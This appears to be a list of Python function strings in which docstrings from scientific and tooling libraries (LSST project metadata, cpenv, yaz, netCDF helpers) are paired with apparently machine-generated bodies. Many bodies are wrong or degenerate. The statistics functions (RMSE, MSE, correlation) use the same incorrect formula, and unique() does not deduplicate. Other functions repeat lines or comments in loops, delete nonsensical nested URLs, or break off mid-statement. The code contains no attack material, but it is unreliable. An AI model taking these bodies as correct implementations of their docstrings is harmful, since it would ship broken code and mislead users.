        "def download_bibliographies(bibtex_names):\n    \"\"\"Asynchronously download a set of lsst-texmf BibTeX bibliographies from\n    GitHub.\n\n    Parameters\n    ----------\n    bibtex_names : sequence of `str`\n        Names of lsst-texmf BibTeX files to download. For example:\n\n        .. code-block:: python\n\n           ['lsst', 'lsst-dm', 'refs', 'books', 'refs_ads']\n\n    Returns\n    -------\n    bibtexs : `list` of `str`\n        List of BibTeX file content, in the same order as ``bibtex_names``.\n    \"\"\"\n    # Download the bibliographies\n    download_bibliographies_async(bibtex_names)\n\n    # Wait for the download to finish",
        "def get_lsst_texmf_bibliographies(bibtex_filenames=None):\n    \"\"\"Get content of lsst-texmf bibliographies.\n\n    BibTeX content is downloaded from GitHub (``master`` branch of\n    https://github.com/lsst/lsst-texmf or retrieved from an in-memory cache.\n\n    Parameters\n    ----------\n    bibtex_filenames : sequence of `str`, optional\n        List of lsst-texmf BibTeX files to retrieve. These can be the filenames\n        of lsst-bibtex files (for example, ``['lsst.bib', 'lsst-dm.bib']``)\n        or names without an extension (``['lsst', 'lsst-dm']``). The default\n        (recommended) is to get *all* lsst-texmf bib",
        "def make_bibliography(lsst_bib_names=None, bibtex=None):\n    \"\"\"Make a pybtex BibliographyData instance from standard lsst-texmf\n    bibliography files and user-supplied bibtex content.\n\n    Parameters\n    ----------\n    lsst_bib_names : sequence of `str`, optional\n        Names of lsst-texmf BibTeX files to include. For example:\n\n        .. code-block:: python\n\n           ['lsst', 'lsst-dm', 'refs', 'books', 'refs_ads']\n\n        Default is `None`, which includes all lsst-texmf bibtex files.\n\n    bibtex : `str`\n        BibTeX source content not included in lsst-texmf. This can be content\n        from a import ``local.bib`` file.",
        "def get_url(entry):\n    \"\"\"Get a usable URL from a pybtex entry.\n\n    Parameters\n    ----------\n    entry : `pybtex.database.Entry`\n        A pybtex bibliography entry.\n\n    Returns\n    -------\n    url : `str`\n        Best available URL from the ``entry``.\n\n    Raises\n    ------\n    NoEntryUrlError\n        Raised when no URL can be made from the bibliography entry.\n\n    Notes\n    -----\n    The order of priority is:\n\n    1. ``url`` field\n    2. ``ls.st`` URL from the handle for ``@docushare`` entries.\n    3. ``adsurl``\n    4. DOI\n    \"\"\"\n    url = entry.get('url')\n    if not url:\n        url = entry.get('ls.st')",
        "def get_author_year_text(entry, parens=False):\n    \"\"\"Get and format author-year text from a pybtex entry to emulate\n    natbib citations.\n\n    Parameters\n    ----------\n    entry : `pybtex.database.Entry`\n        A pybtex bibliography entry.\n    parens : `bool`, optional\n        Whether to add parentheses around the year. Default is `False`.\n\n    Returns\n    -------\n    authoryear : `str`\n        The author-year citation text.\n    \"\"\"\n    author_year = entry.author_year\n    if author_year is None:\n        return None\n    if parens:\n        return author_year.replace('(', '(').replace(')', ')')\n    else:\n        return author_year",
        "def extract_and_transform_metadata(\n    session, github_api_token, ltd_product_data, mongo_collection=None\n):\n    \"\"\"Extract, transform, and load Sphinx-based technote metadata.\n\n    Parameters\n    ----------\n    session : `aiohttp.ClientSession`\n        Your application's aiohttp client session.\n        See http://aiohttp.readthedocs.io/en/stable/client.html.\n    github_api_token : `str`\n        A GitHub personal API token. See the `GitHub personal access token\n        guide`_.\n    ltd_product_data : `dict`\n        Contents of ``metadata.yaml``, obtained via `download_metadata_yaml`.\n        Data for this technote from the LTD Keeper API\n        (``GET /products/<slug>``). Usually obtained via\n        `lsstproject",
        "def reduce_technote_metadata(github_url, metadata, github_data, ltd_product_data):\n    \"\"\"Reduce a technote project's metadata from multiple sources into a\n    single JSON-LD resource.\n\n    Parameters\n    ----------\n    github_url : `str`\n        URL of the technote's GitHub repository.\n    metadata : `dict`\n        The parsed contents of ``metadata.yaml`` found in a technote's\n        repository.\n    github_data : `dict`\n        The contents of the ``technote_repo`` GitHub GraphQL API query.\n    ltd_product_data : `dict`\n        JSON dataset for the technote corresponding to the\n        ``/products/<product>`` of LTD Keeper.\n\n    Returns\n    -------\n    metadata : `dict`\n        JSON-LD-formatted dictionary.\n\n    .. `GitHub personal access",
        "def download_metadata(self):\n        \"\"\"Download the metadata.yaml file from a technote's GitHub repository.\"\"\"\n        url = self.github_url + \"/metadata.yaml\"\n        response = requests.get(url)\n        response.raise_for_status()\n        return response.content",
        "def get_timezone(self):\n        \"\"\"Return the timezone. If none is set use system timezone\"\"\"\n        if self.timezone is None:\n            self.timezone = timezone.get_current_timezone()\n        return self.timezone",
        "def _convert_timestamp(self, timestamp):\n        \"\"\"Convert any timestamp into a datetime and save as _time\"\"\"\n        if timestamp is None:\n            return\n        if isinstance(timestamp, datetime):\n            self._time = timestamp\n        else:\n            self._time = datetime.strptime(timestamp, '%Y-%m-%dT%H:%M:%S.%f')",
        "def to_dict(self):\n        \"\"\"Return a dict that represents the DayOneEntry\"\"\"\n        return {\n            'id': self.id,\n            'name': self.name,\n            'start_date': self.start_date.isoformat(),\n            'end_date': self.end_date.isoformat(),\n            'description': self.description,\n            'location': self.location,\n            'start_time': self.start_time.isoformat(),\n            'end_time': self.end_time.isoformat(),\n            'location_type': self.location_type,\n            'location_id': self.location_id,\n            'location_name': self.location_name,\n            'location_type_id': self.location_type_id,\n            'location_type_name': self.location_type_name,\n",
        "def save_plist(self, filename):\n        \"\"\"Saves a DayOneEntry as a plist\"\"\"\n        with open(filename, 'wb') as f:\n            f.write(self.to_plist())",
        "def _create_dayone_file(self):\n        \"\"\"Create and return full file path for DayOne entry\"\"\"\n        dayone_file = os.path.join(self.dayone_dir, self.dayone_file)\n        if not os.path.exists(dayone_file):\n            os.makedirs(dayone_file)\n        return dayone_file",
        "def combine_files(self, *files):\n        \"\"\"Combine many files into a single file on disk.  Defaults to using the 'time' dimension.\"\"\"\n        if len(files) == 0:\n            return\n        if len(files) == 1:\n            return files[0]\n        if len(files) == 2:\n            return self.combine_files(files[0], files[1])\n        if len(files) == 3:\n            return self.combine_files(files[0], files[1], files[2])\n        raise ValueError(\"Cannot combine files of different dimensions\")",
        "def main(argv=None):\n    \"\"\"The entry point for a yaz script\n\n    This will almost always be called from a python script in\n    the following manner:\n\n        if __name__ == \"__main__\":\n            yaz.main()\n\n    This function will perform the following steps:\n\n    1. It will load any additional python code from\n       the yaz_extension python module located in the\n       ~/.yaz directory when LOAD_YAZ_EXTENSION is True\n       and the yaz_extension module exists\n\n    2. It collects all yaz tasks and plugins.  When WHITE_LIST\n       is a non-empty list, only the tasks and plugins located\n       therein will be considered\n\n    3. It will parse arguments from ARGV, or the command line\n       when ARGV is not given, resulting in a yaz task or a parser\n       help",
        "def task_tree(tasks, plugins, white_list=None):\n    \"\"\"Returns a tree of Task instances\n\n    The tree is comprised of dictionaries containing strings for\n    keys and either dictionaries or Task instances for values.\n\n    When WHITE_LIST is given, only the tasks and plugins in this\n    list will become part of the task tree.  The WHITE_LIST may\n    contain either strings, corresponding to the task of plugin\n    __qualname__, or, preferable, the WHITE_LIST contains\n    links to the task function or plugin class instead.\n    \"\"\"\n    if not white_list:\n        return {k: v for k, v in tasks.items()}\n    else:\n        return {k: v for k, v in tasks.items() if k in white_list}",
        "def task(name: str, *args, **kwargs) -> Callable:\n    \"\"\"\n    Declare a function or method to be a Yaz task\n\n    @yaz.task\n    def talk(message: str = \"Hello World!\"):\n        return message\n\n    Or... group multiple tasks together\n\n    class Tools(yaz.Plugin):\n        @yaz.task\n        def say(self, message: str = \"Hello World!\"):\n            return message\n\n        @yaz.task(option__choices=[\"A\", \"B\", \"C\"])\n        def choose(self, option: str = \"A\"):\n            return option\n    \"\"\"\n    def decorator(func: Callable) -> Callable:\n        @functools.wraps(func)\n        def wrapper(*args, **kwargs):\n            task = Task(name, *args, **kwargs",
        "def get_parameters(self):\n        \"\"\"Returns a list of parameters\"\"\"\n        return [\n            Parameter(name=p, description=p, type=p, default=p)\n            for p in self.get_parameters_list()\n        ]",
        "def get_config(self, key):\n        \"\"\"Returns the configuration for KEY\"\"\"\n        if key in self.config:\n            return self.config[key]\n        else:\n            return None",
        "def get_plugin(name):\n    \"\"\"Returns an instance of a fully initialized plugin class\n\n    Every plugin class is kept in a plugin cache, effectively making\n    every plugin into a singleton object.\n\n    When a plugin has a yaz.dependency decorator, it will be called\n    as well, before the instance is returned.\n    \"\"\"\n    if name not in _plugin_cache:\n        _plugin_cache[name] = _get_plugin(name)\n    return _plugin_cache[name]",
        "def element_to_json(element):\n    \"\"\"Convert an Open511 XML document or document fragment to JSON.\n\n    Takes an lxml Element object. Returns a dict ready to be JSON-serialized.\n    \"\"\"\n    root = element.getroot()\n    if root is None:\n        return None\n    return {\n        'id': root.attrib.get('id'),\n        'type': root.attrib.get('type'),\n        'name': root.attrib.get('name'),\n        'version': root.attrib.get('version'),\n        'description': root.attrib.get('description'),\n        'author': root.attrib.get('author'),\n        'author_email': root.attrib.get('author-email'),\n        'license': root.attrib.get('license'),\n        'license_url': root.attrib.get('license-url'),\n",
        "def _get_geometry_dict(element):\n    \"\"\"Given an lxml Element of a GML geometry, returns a dict in GeoJSON format.\"\"\"\n    geometry = {}\n    for child in element.iter():\n        if child.tag == 'Point':\n            geometry['coordinates'] = [float(x) for x in child.iter()]\n        elif child.tag == 'MultiPoint':\n            geometry['coordinates'] = [float(x) for x in child.iter()]\n        elif child.tag == 'LineString':\n            geometry['coordinates'] = [float(x) for x in child.iter()]\n        elif child.tag == 'MultiLineString':\n            geometry['coordinates'] = [float(x) for x in child.iter()]\n        elif child.tag == 'Polygon':\n            geometry['coordinates'] = [float(x) for x in child.iter()]",
        "def _deprecated_gml_to_geojson(gml):\n    \"\"\"Translates a deprecated GML 2.0 geometry to GeoJSON\"\"\"\n    if gml.is_empty:\n        return None\n    if gml.is_multipoint:\n        return _deprecated_gml_to_geojson(gml.get_multipoint())\n    if gml.is_point:\n        return _deprecated_gml_to_geojson(gml.get_point())\n    if gml.is_polygon:\n        return _deprecated_gml_to_geojson(gml.get_polygon())\n    if gml.is_multipoint_list:\n        return _deprecated_gml_to_geojson(gml.get_multipoint_list())\n    if gml.is_multipoint_set:\n        return",
        "def lsstprojectmeta_deparagraph(content):\n    \"\"\"Panflute filter function that converts content wrapped in a Para to\n    Plain.\n\n    Use this filter with pandoc as::\n\n        pandoc [..] --filter=lsstprojectmeta-deparagraph\n\n    Only lone paragraphs are affected. Para elements with siblings (like a\n    second Para) are left unaffected.\n\n    This filter is useful for processing strings like titles or author names so\n    that the output isn't wrapped in paragraph tags. For example, without\n    this filter, pandoc converts a string ``\"The title\"`` to\n    ``<p>The title</p>`` in HTML. These ``<p>`` tags aren't useful if you\n    intend to put the title text in ``<h1>`` tags using your own templating\n    system.\n    \"\"\"\n",
        "def _get_subclasses(cls):\n    \"\"\"Recursively generate of all the subclasses of class cls.\"\"\"\n    for subcls in cls.__subclasses__():\n        yield subcls\n        for subsubcls in _get_subclasses(subcls):\n            yield subsubcls",
        "def unique(iterable):\n    \"\"\"List unique elements, preserving order. Remember only the element just seen.\"\"\"\n    seen = set()\n    return list(itertools.chain.from_iterable(\n        itertools.chain.from_iterable(\n            (x for x in iterable if x not in seen)\n        )\n    ))",
        "def _mask_dict(data, minv, maxv, valid_range):\n    \"\"\"\n    Returns a masked array with anything outside of values masked.\n    The minv and maxv parameters take precendence over any dict values.\n    The valid_range attribute takes precendence over the valid_min and\n    valid_max attributes.\n    \"\"\"\n    if minv is None:\n        minv = data.min()\n    if maxv is None:\n        maxv = data.max()\n    if valid_range is None:\n        valid_range = data.valid_range()\n    return data[~valid_range]",
        "def _as_list(obj):\n    \"\"\"If input object is an ndarray it will be converted into a list\"\"\"\n    if isinstance(obj, np.ndarray):\n        return obj.tolist()\n    return obj",
        "def _get_data_dict(self, data):\n        \"\"\"\n        If input object is an ndarray it will be converted into a dict\n        holding dtype, shape and the data, base64 encoded.\n        \"\"\"\n        if isinstance(data, np.ndarray):\n            data = data.reshape(data.shape)\n            data = data.astype(np.uint8)\n            return {'dtype': data.dtype, 'shape': data.shape, 'data': data.tostring()}\n        return {'dtype': data.dtype, 'shape': data.shape, 'data': data}",
        "def _get_left_sib(self, node):\n        \"\"\"\n        leftSibling\n        previousSibling\n        leftSib\n        prevSib\n        lsib\n        psib\n        \n        have the same parent,and on the left\n        \"\"\"\n        if node.leftSibling is not None:\n            return node.leftSibling\n        if node.prevSibling is not None:\n            return node.prevSibling\n        if node.leftSib is not None:\n            return node.leftSib\n        if node.psib is not None:\n            return node.psib\n        return None",
        "def _get_right_sibling(self, sibling):\n        \"\"\"\n        rightSibling\n        nextSibling\n        rightSib\n        nextSib\n        rsib\n        nsib\n        \n        have the same parent,and on the right\n        \"\"\"\n        if sibling.parent is None:\n            return None\n        if sibling.parent.is_root:\n            return sibling\n        if sibling.parent.is_root:\n            return sibling.parent.get_right_sibling(sibling)\n        return sibling.parent.get_right_sibling(sibling.parent)",
        "def _update_parents(self, parents):\n        \"\"\"\n        leftCousin\n        previousCousin\n        leftCin\n        prevCin\n        lcin\n        pcin\n        \n        parents are neighbors,and on the left\n        \"\"\"\n        for parent in parents:\n            if parent.leftCousin is not None:\n                self.leftCousin.add(parent)\n            if parent.prevCousin is not None:\n                self.prevCousin.add(parent)\n            if parent.leftCin is not None:\n                self.leftCin.add(parent)\n            if parent.prevCin is not None:\n                self.prevCin.add(parent)\n            if parent.lcin is not None:\n                self.lcin.add(parent)\n            if parent.pcin is not None:",
        "def _get_parents(self, parents):\n        \"\"\"\n        rightCousin\n        nextCousin\n        rightCin\n        nextCin\n        rcin\n        ncin\n        \n        parents are neighbors,and on the right\n        \"\"\"\n        parents_right = []\n        parents_next = []\n        parents_rc = []\n        parents_nc = []\n        for parent in parents:\n            if parent.rightCousin is not None:\n                parents_right.append(parent)\n            if parent.nextCousin is not None:\n                parents_next.append(parent)\n            if parent.rightCin is not None:\n                parents_right.append(parent)\n            if parent.nextCin is not None:\n                parents_next.append(parent)\n            if parent.rcin is not None:\n                parents_",
        "def _creat_child_desc(self, path, depth, parent_breadth_path, parent_path,\n                          sib_seq, lsib_path, rsib_path, lcin_path, rcin_path):\n        \"\"\"\n        _creat_child_desc\n            update depth,parent_breadth_path,parent_path,sib_seq,path,lsib_path,rsib_path,lcin_path,rcin_path\n        \"\"\"\n        if path in self.children:\n            self.children[path].update(\n                (depth, parent_breadth_path, parent_path,\n                 sib_seq, lsib_path, rsib_path, lcin_path, rcin_path))\n        else:\n            self.children[path] = (depth, parent_breadth_path, parent_path,\n                                   sib",
        "def _upgrade_breadth_info(self, desc_level, breadth, breadth_path, desc):\n        \"\"\" _upgrade_breadth_info\n            update breadth, breadth_path, and add desc to desc_level\n        \"\"\"\n        if breadth is None:\n            breadth = 0\n        if breadth_path is None:\n            breadth_path = []\n        desc_level.append(desc)\n        if desc in self.breadths:\n            self.breadths[desc].append(breadth)\n        else:\n            self.breadths[desc] = [breadth]\n            self.breadths[desc].append(breadth_path)",
        "def parse_commands(self, source):\n        \"\"\"Parse command content from the LaTeX source.\n\n        Parameters\n        ----------\n        source : `str`\n            The full source of the tex document.\n\n        Yields\n        ------\n        parsed_command : `ParsedCommand`\n            Yields parsed commands instances for each occurence of the command\n            in the source.\n        \"\"\"\n        for line in source.splitlines():\n            line = line.strip()\n            if line.startswith('#'):\n                continue\n            if line.startswith('@'):\n                continue\n            if line.startswith('@' + self.command_prefix):\n                yield self.parse_command(line)\n            else:\n                yield self.parse_command_line(line)",
        "def _parse_command(self, source, start_index):\n        \"\"\"Parse a single command.\n\n        Parameters\n        ----------\n        source : `str`\n            The full source of the tex document.\n        start_index : `int`\n            Character index in ``source`` where the command begins.\n\n        Returns\n        -------\n        parsed_command : `ParsedCommand`\n            The parsed command from the source at the given index.\n        \"\"\"\n        command_type = source[start_index:start_index + 1]\n        command_name = source[start_index + 1:start_index + 2]\n        command_args = source[start_index + 2:start_index + 3]\n        command_kwargs = source[start_index + 3:start_index + 4]\n        command_kwargs_dict = self._parse_kwargs(command_kwargs)\n",
        "def _parse_whitespace_argument(self, source, name):\n        r\"\"\"Attempt to parse a single token on the first line of this source.\n\n        This method is used for parsing whitespace-delimited arguments, like\n        ``\\input file``. The source should ideally contain `` file`` along\n        with a newline character.\n\n        >>> source = 'Line 1\\n' r'\\input test.tex' '\\nLine 2'\n        >>> LatexCommand._parse_whitespace_argument(source, 'input')\n        'test.tex'\n\n        Bracket delimited arguments (``\\input{test.tex}``) are handled in\n        the normal logic of `_parse_command`.\n        \"\"\"\n        match = re.search(r'\\{([^}]+)\\}', source, re.MULTILINE)\n        if match:\n            return match.group(1)\n        else",
        "def get_event_converters(self, doc):\n        \"\"\"\n        Returns a list of TMDDEventConverter elements.\n\n        doc is an XML Element containing one or more <FEU> events\n        \"\"\"\n        event_converters = []\n        for event in doc.getElementsByTagName('FEU'):\n            event_converters.append(\n                TMDDEventConverter(self, event))\n        return event_converters",
        "def _skip_dimension(self, name):\n        \"\"\"Mostly ripped from nc3tonc4 in netCDF4-python.\n        Added ability to skip dimension and variables.\n        Removed all of the unpacking logic for shorts.\n        \"\"\"\n        if name in self.variables:\n            self.variables[name].skip_dimension = True\n        if name in self.dimensions:\n            self.dimensions[name].skip_dimension = True",
        "def to_dataframe(self):\n        \"\"\"\n        Returns a Pandas DataFrame of the data.\n        This always returns positive down depths\n        \"\"\"\n        df = pd.DataFrame(self.data)\n        df.index = df.index.apply(lambda x: x > 0)\n        return df",
        "def load_query(self, query_name):\n        \"\"\"Load a pre-made query.\n\n        These queries are distributed with lsstprojectmeta. See\n        :file:`lsstrojectmeta/data/githubv4/README.rst` inside the\n        package repository for details on available queries.\n\n        Parameters\n        ----------\n        query_name : `str`\n            Name of the query, such as ``'technote_repo'``.\n\n        Returns\n        -------\n        github_query : `GitHubQuery\n            A GitHub query or mutation object that you can pass to\n            `github_request` to execute the request itself.\n        \"\"\"\n        query_path = self.query_path(query_name)\n        github_query = self.github_request(query_path)\n        return github_query",
        "def get_commit_timestamp(filepath, repo_path=None, repo=None):\n    \"\"\"Obtain the timestamp for the most recent commit to a given file in a\n    Git repository.\n\n    Parameters\n    ----------\n    filepath : `str`\n        Absolute or repository-relative path for a file.\n    repo_path : `str`, optional\n        Path to the Git repository. Leave as `None` to use the current working\n        directory or if a ``repo`` argument is provided.\n    repo : `git.Repo`, optional\n        A `git.Repo` instance.\n\n    Returns\n    -------\n    commit_timestamp : `datetime.datetime`\n        The datetime of the most recent commit to the given file.\n\n    Raises\n    ------\n    IOError\n        Raised if the ``filepath`` does not exist in the Git repository.\n    \"\"\"\n    if repo is None:\n",
        "def get_commit_date(extensions, acceptance_callback, root_dir='.'):\n    \"\"\"Get the datetime for the most recent commit to a project that\n    affected certain types of content.\n\n    Parameters\n    ----------\n    extensions : sequence of 'str'\n        Extensions of files to consider in getting the most recent commit\n        date. For example, ``('rst', 'svg', 'png')`` are content extensions\n        for a Sphinx project. **Extension comparision is case sensitive.** add\n        uppercase variants to match uppercase extensions.\n    acceptance_callback : callable\n        Callable function whose sole argument is a file path, and returns\n        `True` or `False` depending on whether the file's commit date should\n        be considered or not. This callback is only run on files that are\n        included by ``extensions``. Thus this callback is a way to exclude\n        specific files that would",
        "def iter_files_by_extension(extname, root_dir=None):\n    \"\"\"Iterative over relative filepaths of files in a directory, and\n    sub-directories, with the given extension.\n\n    Parameters\n    ----------\n    extname : `str`\n        Extension name (such as 'txt' or 'rst'). Extension comparison is\n        case sensitive.\n    root_dir : 'str`, optional\n        Root directory. Current working directory by default.\n\n    Yields\n    ------\n    filepath : `str`\n        File path, relative to ``root_dir``, with the given extension.\n    \"\"\"\n    root_dir = root_dir or os.getcwd()\n    for filepath in os.listdir(root_dir):\n        filepath = os.path.join(root_dir, filepath)\n        if os.path.isdir(filepath):\n           ",
        "def get_variables_by_attributes(self, **kwargs):\n        \"\"\"\n        Returns variables that match specific conditions.\n\n        * Can pass in key=value parameters and variables are returned that\n        contain all of the matches.  For example,\n\n        >>> # Get variables with x-axis attribute.\n        >>> vs = nc.get_variables_by_attributes(axis='X')\n        >>> # Get variables with matching \"standard_name\" attribute.\n        >>> nc.get_variables_by_attributes(standard_name='northward_sea_water_velocity')\n\n        * Can pass in key=callable parameter and variables are returned if the\n        callable returns True.  The callable should accept a single parameter,\n        the attribute value.  None is given as the attribute value when the\n        attribute does not exist on the variable. For example,\n\n        >>> # Get",
        "def _set_vfuncs(self, vfuncs):\n        \"\"\"\n        vfuncs can be any callable that accepts a single argument, the\n        Variable object, and returns a dictionary of new attributes to\n        set. These will overwrite existing attributes\n        \"\"\"\n        if not vfuncs:\n            return\n        for k, v in vfuncs.items():\n            if isinstance(v, Variable):\n                self._set_vfuncs(v.vfuncs)\n            else:\n                setattr(self, k, v)",
        "def requires_pandoc(func):\n    \"\"\"Decorate a function that uses pypandoc to ensure that pandoc is\n    installed if necessary.\n    \"\"\"\n    @wraps(func)\n    def wrapper(*args, **kwargs):\n        if not HAS_PANDOC:\n            raise ImportError(\"pandoc is not installed\")\n        return func(*args, **kwargs)\n    return wrapper",
        "def convert_text(\n    content,\n    from_fmt,\n    to_fmt,\n    deparagraph=False,\n    mathjax=False,\n    smart=True,\n    extra_args=None,\n):\n    \"\"\"Convert text from one markup format to another using pandoc.\n\n    This function is a thin wrapper around `pypandoc.convert_text`.\n\n    Parameters\n    ----------\n    content : `str`\n        Original content.\n\n    from_fmt : `str`\n        Format of the original ``content``. Format identifier must be one of\n        those known by Pandoc.\n    to_fmt : `str`\n        Output format for the content.\n\n    deparagraph : `bool`, optional\n        If `True`, then the\n        `lsstprojectmeta.pandoc.filters.deparagraph.deparagraph` filter is\n",
        "def convert_latex(content, to_fmt, deparagraph=False, mathjax=False, smart=True,\n                 extra_args=None):\n    \"\"\"Convert lsstdoc-class LaTeX to another markup format.\n\n    This function is a thin wrapper around `convert_text` that automatically\n    includes common lsstdoc LaTeX macros.\n\n    Parameters\n    ----------\n    content : `str`\n        Original content.\n\n    to_fmt : `str`\n        Output format for the content (see https://pandoc.org/MANUAL.html).\n        For example, 'html5'.\n\n    deparagraph : `bool`, optional\n        If `True`, then the\n        `lsstprojectmeta.pandoc.filters.deparagraph.deparagraph` filter is\n        used to remove paragraph (``<p>``, for example) tags around a single",
        "def decode_jsonld(encoded_dataset):\n    \"\"\"Decode a JSON-LD dataset, including decoding datetime\n    strings into `datetime.datetime` objects.\n\n    Parameters\n    ----------\n    encoded_dataset : `str`\n        The JSON-LD dataset encoded as a string.\n\n    Returns\n    -------\n    jsonld_dataset : `dict`\n        A JSON-LD dataset.\n\n    Examples\n    --------\n\n    >>> doc = '{\"dt\": \"2018-01-01T12:00:00Z\"}'\n    >>> decode_jsonld(doc)\n    {'dt': datetime.datetime(2018, 1, 1, 12, 0, tzinfo=datetime.timezone.utc)}\n    \"\"\"\n    jsonld_dataset = json.loads(encoded_dataset)\n    if 'dt' in jsonld_dataset:\n        jsonld_dataset['dt'] = datetime.",
        "def encode(self, value):\n        \"\"\"Encode values as JSON strings.\n\n        This method overrides the default implementation from\n        `json.JSONEncoder`.\n        \"\"\"\n        if isinstance(value, (list, tuple)):\n            return [self.encode(v) for v in value]\n        return super(JSONEncoder, self).encode(value)",
        "def get_git_repos(self):\n        \"\"\"Get all git repositories within this environment\"\"\"\n        repos = []\n        for repo in self.git_repos:\n            repos.append(repo.path)\n        return repos",
        "def pip_install(package, **kwargs):\n    \"\"\"Install a python package using pip\"\"\"\n    pip_args = ['install', package]\n    pip_args.extend(kwargs.get('pip_args', []))\n    return subprocess.call(pip_args)",
        "def pip_update(self, package, force=False):\n        \"\"\"Update a python package using pip\"\"\"\n        if not force:\n            self.log.info(\"Updating %s\" % package)\n            self.pip_install(package)\n        else:\n            self.log.info(\"Skipping %s\" % package)",
        "def nb_quantiles(self, datas):\n        \"\"\"\n        Returns the nb quantiles for datas in a dataframe\n        \"\"\"\n        if len(datas) == 0:\n            return 0\n        return np.percentile(datas, self.percentile)",
        "def root_mean_square_error(a, b):\n    \"\"\"Returns the root mean square error betwwen a and b\"\"\"\n    return np.sqrt(np.sum(a * b, axis=1) / np.sum(a, axis=1))",
        "def mean_squared_error(a, b):\n    \"\"\"Returns the normalized mean square error of a and b\"\"\"\n    return np.sqrt(np.sum(a * b, axis=1) / np.sum(a, axis=1))",
        "def mean_bias_error(self):\n        \"\"\"Returns the mean fractionalized bias error\"\"\"\n        return self.mean_error(self.bias_errors) / self.mean_error(self.bias_errors.mean())",
        "def get_factor_of_exceedance(self, data):\n        \"\"\"\n        Returns the factor of exceedance\n        \"\"\"\n        if self.exceedance_factor is None:\n            return 0\n        return self.exceedance_factor * (data - self.exceedance_mean)",
        "def correlation(a, b):\n    \"\"\"\n    Computes the correlation between a and b, says the Pearson's correlation\n    coefficient R\n    \"\"\"\n    return np.sqrt(np.sum(a * b, axis=1) / np.sum(b, axis=1))",
        "def geometric_mean_bias(self):\n        \"\"\"Geometric mean bias\"\"\"\n        if self.is_continuous:\n            return self.mean_bias\n        else:\n            return self.mean_bias * (self.mean_bias - self.mean_bias)",
        "def geom_mean_var(self, x):\n        \"\"\"Geometric mean variance\"\"\"\n        return np.sqrt(np.sum(x ** 2, axis=1) / np.sum(x, axis=1))",
        "def _get_time_figure(self, time_start, time_end):\n        \"\"\"Figure of merit in time\"\"\"\n        time_start = datetime.datetime.combine(time_start, datetime.time(0, 0, 0))\n        time_end = datetime.datetime.combine(time_end, datetime.time(0, 0, 0))\n        time_start = time_start.replace(tzinfo=pytz.utc)\n        time_end = time_end.replace(tzinfo=pytz.utc)\n        time_start = time_start.replace(tzinfo=pytz.utc)\n        time_end = time_end.replace(tzinfo=pytz.utc)\n        time_start = time_start.replace(tzinfo=pytz.utc)\n        time_end = time_end.replace(tzinfo=pytz",
        "def _perform_stats(a, b):\n    \"\"\"\n    Performs several stats on a against b, typically a is the predictions\n    array, and b the observations array\n\n    Returns:\n        A dataFrame of stat name, stat description, result\n    \"\"\"\n    # TODO: This is a temporary hack to get around the fact that the\n    #   _perform_stats() method is called on a DataFrame, which is not a DataFrame.\n    #   This is a temporary hack to get around the fact that the\n    #   _perform_stats() method is called on a DataFrame, which is not a DataFrame.\n    #   This is a temporary hack to get around the fact that the\n    #   _perform_stats() method is called on a DataFrame, which is not a DataFrame.\n    #   This is a temporary hack to get around the fact that the\n    #   _perform_stats() method",
        "def site_packages_path():\n    \"\"\"Path to environments site-packages\"\"\"\n    return os.path.join(os.path.dirname(__file__), 'site-packages')",
        "def deactivate(self):\n        \"\"\"Prior to activating, store everything necessary to deactivate this\n        environment.\"\"\"\n        self.active = False\n        self.active_time = time.time()\n        self.last_active = time.time()\n        self.last_deactivate = time.time()",
        "def activate_python(self):\n        \"\"\"Do some serious mangling to the current python environment...\n        This is necessary to activate an environment via python.\n        \"\"\"\n        if self.python is None:\n            self.python = sys.executable\n        if self.python_version is None:\n            self.python_version = sys.version\n        if self.python_version < '3':\n            self.python = self.python.replace('python', 'python3')\n        if self.python_version < '3':\n            self.python = self.python.replace('python3', 'python')",
        "def remove(self):\n        \"\"\"Remove this environment\"\"\"\n        self.client.delete(self.url)\n        self.client.delete(self.env_url)\n        self.client.delete(self.env_url + '/config')\n        self.client.delete(self.env_url + '/config/env')\n        self.client.delete(self.env_url + '/config/env/config')\n        self.client.delete(self.env_url + '/config/env/config/config')\n        self.client.delete(self.env_url + '/config/env/config/config/config')\n        self.client.delete(self.env_url + '/config/env/config/config/config/config')\n        self.client.delete(self.env_url + '/config/env/config/config/config/config/config",
        "def launch(self):\n        \"\"\"Command used to launch this application module\"\"\"\n        self.log.info(\"Launching %s\", self.name)\n        self.log.debug(\"Arguments: %s\", self.args)\n        self.log.debug(\"Environment: %s\", self.env)\n        self.log.debug(\"Working directory: %s\", self.cwd)\n        self.log.debug(\"Working directory: %s\", self.cwd)\n        self.log.debug(\"Working directory: %s\", self.cwd)\n        self.log.debug(\"Working directory: %s\", self.cwd)\n        self.log.debug(\"Working directory: %s\", self.cwd)\n        self.log.debug(\"Working directory: %s\", self.cwd)\n        self.log.debug(\"Working directory: %s\", self.cwd)\n        self.log",
        "def create(name_or_path, config=None, **kwargs):\n    \"\"\"\n    Create a virtual environment. You can pass either the name of a new\n    environment to create in your CPENV_HOME directory OR specify a full path\n    to create an environment outisde your CPENV_HOME.\n\n    Create an environment in CPENV_HOME::\n\n        >>> cpenv.create('myenv')\n\n    Create an environment elsewhere::\n\n        >>> cpenv.create('~/custom_location/myenv')\n\n    :param name_or_path: Name or full path of environment\n    :param config: Environment configuration including dependencies etc...\n    \"\"\"\n    if not name_or_path:\n        raise ValueError('You must specify a name to create')\n\n    if not config:\n        config = {}\n\n    if not os.path.exists(name",
        "def remove(name_or_path):\n    \"\"\"Remove an environment or module\n\n    :param name_or_path: name or path to environment or module\n    \"\"\"\n    if isinstance(name_or_path, str):\n        name_or_path = os.path.expanduser(name_or_path)\n    if os.path.isdir(name_or_path):\n        shutil.rmtree(name_or_path)\n    else:\n        os.remove(name_or_path)",
        "def launch_module(module_name):\n    \"\"\"Activates and launches a module\n\n    :param module_name: name of module to launch\n    \"\"\"\n    module = importlib.import_module(module_name)\n    module.activate()\n    module.launch()",
        "def deactivate_environment(env_name):\n    \"\"\"\n    Deactivates an environment by restoring all env vars to a clean state\n    stored prior to activating environments\n    \"\"\"\n    with Session() as session:\n        try:\n            session.Environment.delete(env_name)\n        except Exception as e:\n            raise Exception(\"Error deactivating environment: %s\" % e)",
        "def get_modules(self):\n        \"\"\"Returns a list of available modules.\"\"\"\n        modules = []\n        for module in self.get_modules_from_path():\n            if module.is_module:\n                modules.append(module)\n        return modules",
        "def add_module(self, module):\n        \"\"\"Add a module to CPENV_ACTIVE_MODULES environment variable\"\"\"\n        if module.name in self.modules:\n            raise ValueError(\"Module '%s' already in CPENV_ACTIVE_MODULES\" %\n                             module.name)\n        self.modules[module.name] = module",
